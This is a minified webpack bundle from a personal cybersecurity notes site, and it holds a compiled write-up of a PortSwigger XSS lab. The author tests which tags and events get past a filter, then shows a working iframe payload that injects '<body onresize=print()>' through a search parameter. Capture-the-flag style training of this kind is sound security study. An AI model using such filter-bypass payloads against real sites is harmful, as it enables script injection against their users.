"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[3495],{3905:function(e,t,n){n.d(t,{Zo:function(){return s},kt:function(){return f}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},s=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,s=c(e,["components","mdxType","originalType","parentName"]),d=l(n),f=a,m=d["".concat(p,".").concat(f)]||d[f]||u[f]||o;return n?r.createElement(m,i(i({ref:t},s),{},{components:n})):r.createElement(m,i({ref:t},s))}));function f(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var c={};for(var p in t)hasOwnProperty.call(t,p)&&(c[p]=t[p]);c.originalType=e,c.mdxType="string"==typeof e?e:a,i[1]=c;for(var l=2;l<o;l++)i[l]=n[l];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},9880:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return c},contentTitle:function(){return p},metadata:function(){return l},toc:function(){return s},default:function(){return d}});var r=n(7462),a=n(3366),o=(n(7294),n(3905)),i=["components"],c={},p=void 0,l={unversionedId:"portswigger/XSS/Lab-2",id:"portswigger/XSS/Lab-2",title:"Lab-2",description:"--\x3e i found that custom tags and `` tags are accepted.",source:"@site/docs/portswigger/XSS/Lab-2.md",sourceDirName:"portswigger/XSS",slug:"/portswigger/XSS/Lab-2",permalink:"/Cybernotes/docs/portswigger/XSS/Lab-2",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Intro",permalink:"/Cybernotes/docs/portswigger/XSS/Intro"},next:{title:"Lab-3",permalink:"/Cybernotes/docs/portswigger/XSS/Lab-3"}},s=[],u={toc:s};function d(e){var t=e.components,c=(0,a.Z)(e,i);return(0,o.kt)("wrapper",(0,r.Z)({},u,c,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"--\x3e i found that ",(0,o.kt)("inlineCode",{parentName:"p"},"custom tags")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"<body>")," tags are accepted."),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(5286).Z,width:"1287",height:"565"})),(0,o.kt)("p",null,"--\x3e Now we know that we can use ",(0,o.kt)("inlineCode",{parentName:"p"},"body")," tag so let's now brute force for events."),(0,o.kt)("p",null,"I used this payload :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-markup"},"<body id=x tabindex=1 onactivate=alert(1)></body>\n")),(0,o.kt)("p",null,"And i found ",(0,o.kt)("inlineCode",{parentName:"p"},"onresize")," event is accepted."),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(4951).Z,width:"1289",height:"609"})),(0,o.kt)("p",null,"--\x3e So i searched for payload with body tag and onresize event and then i found this payload"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-markup"},'<body onresize="print()">\n')),(0,o.kt)("p",null,"--\x3e but unfortunately it didn't worked :("),(0,o.kt)("p",null,"==> And we have to goto ",(0,o.kt)("inlineCode",{parentName:"p"},"exploit-server")," tab and then enter your payload and then click ",(0,o.kt)("inlineCode",{parentName:"p"},"deliver exploit to victim")),(0,o.kt)("p",null,"Then i tried this payload and it worked !"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<iframe\n  src="https://ac721f141f257377c03016fb002900d7.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"\n  onload="this.style.width"\n  ="100px"\n>\n</iframe>\n')))}d.isMDXComponent=!0},5286:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211026143657-39c8cb13c263235e9f8359c04a6718de.png"},4951:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20211026144237-f013f4663d3d980729ce59dc7284ab51.png"}}]);